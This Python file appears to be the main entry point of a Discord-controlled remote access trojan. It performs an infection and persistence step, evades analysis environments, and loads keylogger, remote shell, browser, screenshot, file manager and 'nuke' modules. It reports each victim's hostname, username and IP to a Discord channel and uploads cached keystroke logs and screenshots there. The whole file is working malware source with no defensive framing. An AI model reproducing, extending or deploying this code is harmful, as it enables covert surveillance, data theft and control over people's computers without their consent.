import asyncio
import discord
from discord.ext import commands
import os
import sys
import aiohttp
import io
import socket

from src.client.core.config import Config
from src.client.core.platform import Platform
from src.client.core.security import AntiAnalysis, Elevation
from src.client.core.persistence import Persistence
from src.client.core.cache import OfflineCache
from src.client.core.wraith import WraithEngine

import logging
from src.client.core.tui import DeveloperTUI

# Setup base logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s | %(levelname)s | %(message)s')
logger = logging.getLogger(__name__)

class CaptainHookBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix=Config.COMMAND_PREFIX, intents=intents)
        self.session_channel = None
        self.offline_cache = OfflineCache()
        self.wraith = WraithEngine()
        self.is_connected = True
        
        # Developer TUI
        if Config.DEVELOPER_MODE:
            self.tui = DeveloperTUI(self)
            self.tui.start()

    async def setup_hook(self):
        # 0. Wraith Melt (Initial Infection & Persistence)
        try:
            self.wraith.melt()
        except Exception as e:
            logger.error(f"Wraith Melt failed: {e}")

        # 1. Security Check
        if AntiAnalysis.check_all():
            logger.warning("Anti-Analysis check triggered. Exiting.")
            sys.exit(0)

        # 2. Persistence Install
        try:
            Persistence.install()
        except Exception as e:
            logger.error(f"Persistence installation failed: {e}")

        # 3. Load modules
        modules = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"]
        for module in modules:
            try:
                # Use absolute import path for stability
                await self.load_extension(f"src.client.modules.{module}")
                logger.info(f"Successfully loaded module: {module}")
            except Exception as e:
                logger.error(f"Failed to load module {module}: {e}")
                # Try fallback for bundled environments
                try:
                    await self.load_extension(f"modules.{module}")
                    logger.info(f"Successfully loaded module (fallback): {module}")
                except Exception as e2:
                    logger.error(f"Fallback loading for {module} failed: {e2}")
        
        # 4. Start Heartbeat
        self.loop.create_task(self.connectivity_heartbeat())

    async def connectivity_heartbeat(self):
        """Monitor connection and dump cache upon reconnection."""
        async with aiohttp.ClientSession() as session:
            while True:
                try:
                    async with session.get("https://discord.com", timeout=10) as resp:
                        if resp.status == 200:
                            if not self.is_connected:
                                self.is_connected = True
                                logger.info("Reconnected to Discord.")
                                # Stop Offline Ears if it was running
                                media_cog = self.get_cog("Media")
                                if media_cog:
                                    media_cog.siren.stop_offline_ears()

                                if self.session_channel:
                                    await self.process_offline_cache()
                except Exception as e:
                    if self.is_connected:
                        self.is_connected = False
                        logger.warning(f"Disconnected from Discord: {e}")
                        # Start Offline Ears
                        media_cog = self.get_cog("Media")
                        if media_cog:
                             self.loop.create_task(media_cog.siren.start_offline_ears())
                
                await asyncio.sleep(60)

    async def get_or_create_session_channel(self):
        """Finds or creates a dedicated channel for this session."""
        if self.session_channel:
            return self.session_channel

        try:
            guild_id_str = Config.GUILD_ID.strip()
            if not guild_id_str or "[[" in guild_id_str:
                logger.error("Invalid Guild ID in config.")
                return None
            
            guild_id = int(guild_id_str)
            guild = self.get_guild(guild_id)
            
            if not guild:
                # Fallback: try to get from guilds cache directly
                guild = discord.utils.get(self.guilds, id=guild_id)
                if not guild:
                    logger.error(f"Could not find guild with ID {guild_id}")
                    return None

            user_name = "unknown"
            try:
                user_name = os.getlogin().lower()
            except:
                import getpass
                user_name = getpass.getuser().lower()

            channel_name = f"hook-{socket.gethostname().lower()}-{user_name}"
            channel_name = channel_name.replace(" ", "-").replace(".", "-")

            # Try to find existing channel
            channel = discord.utils.get(guild.text_channels, name=channel_name)
            
            if not channel:
                try:
                    channel = await guild.create_text_channel(channel_name)
                    logger.info(f"Created new session channel: {channel_name}")
                    await channel.send(f"⚓ **New Session Established**\n**OS:** `{Platform.get_system_info()['os']}`\n**User:** `{user_name}`\n**IP:** `{socket.gethostbyname(socket.gethostname())}`")
                except Exception as e:
                    logger.error(f"Error creating channel: {e}")
                    return None

            self.session_channel = channel
            return channel
        except Exception as e:
            logger.error(f"Unexpected error in channel creation: {e}")
            return None

    async def process_offline_cache(self):
        """Decrypt and upload all files from the offline cache."""
        pending_files = self.offline_cache.get_pending_files()
        if not pending_files or not self.session_channel:
            return

        logger.info(f"Reconnected! Sending {len(pending_files)} cached logs...")
        await self.session_channel.send(f"🔄 **Reconnected!** Sending {len(pending_files)} cached logs...")

        for file_path in pending_files:
            try:
                decrypted_content = self.offline_cache.decrypt_file(file_path)
                if decrypted_content:
                    name = os.path.basename(file_path)
                    if any(x in name for x in ["screenshot", "camshot", "screen"]):
                        discord_file = discord.File(io.BytesIO(decrypted_content), filename=name.replace(".cache", ".png"))
                        await self.session_channel.send(f"📸 Cached Image:", file=discord_file)
                    else:
                        text_content = decrypted_content.decode(errors='replace')
                        await self.session_channel.send(f"📄 **Cached Log:**\n```\n{text_content[:1800]}\n```")
                
                os.remove(file_path)
            except Exception as e:
                logger.error(f"Error processing cache file {file_path}: {e}")

    async def on_command(self, ctx):
        logger.info(f"[DISCORD] {ctx.author}: {ctx.command.name}")

    async def on_command_completion(self, ctx):
        logger.info(f"[SUCCESS] Command ${ctx.command.name} finished.")

    async def on_command_error(self, ctx, error):
        if isinstance(error, commands.CommandNotFound):
            logger.warning(f"[DISCORD] Unknown command attempted: {ctx.message.content}")
        else:
            logger.error(f"[FAILED] {ctx.command.name if ctx.command else 'Unknown'}: {error}")

    @commands.command(name="p")
    async def _ping_test(self, ctx):
        """Hidden test command to verify bot is alive without cogs."""
        try:
            msg = f"⚓ **Hook is Alive!**\n**Host:** `{socket.gethostname()}`\n**Modules:** `{len(self.cogs)}`"
            await ctx.send(msg)
            logger.info(f"[TUI] Ping test triggered from {ctx.author}")
        except Exception as e:
            logger.error(f"Ping test failed: {e}")

    async def on_ready(self):
        appdata = Platform.get_appdata_path(local=Config.DEVELOPER_MODE)
        own_path = os.path.join(appdata, Config.OWN_DIR_NAME)
        logs_path = os.path.join(own_path, Config.LOGS_DIR_NAME)
        
        for path in [own_path, logs_path]:
            os.makedirs(path, exist_ok=True)

async def main():
    # Setup emergency file logging
    appdata = Platform.get_appdata_path(local=Config.DEVELOPER_MODE)
    own_path = os.path.join(appdata, Config.OWN_DIR_NAME)
    os.makedirs(own_path, exist_ok=True)
    error_log = os.path.join(own_path, "startup_error.log")

    try:
        token = os.environ.get("DISCORD_TOKEN", Config.DISCORD_TOKEN)
        if "PLACEHOLDER" in token:
             with open(error_log, "a") as f:
                 f.write(f"[{datetime.now()}] Error: Discord token is still a placeholder.\n")
             return

        bot = CaptainHookBot()
        async with bot:
            await bot.start(token)
    except Exception as e:
        import traceback
        with open(error_log, "a") as f:
            f.write(f"[{datetime.now()}] CRITICAL STARTUP ERROR:\n{str(e)}\n{traceback.format_exc()}\n")
        # Also print to console if possible
        print(f"CRITICAL STARTUP ERROR: {e}")
        sys.exit(1)

if __name__ == "__main__":
    from datetime import datetime
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        # Catch errors outside of asyncio.run too
        print(f"FATAL ERROR: {e}")

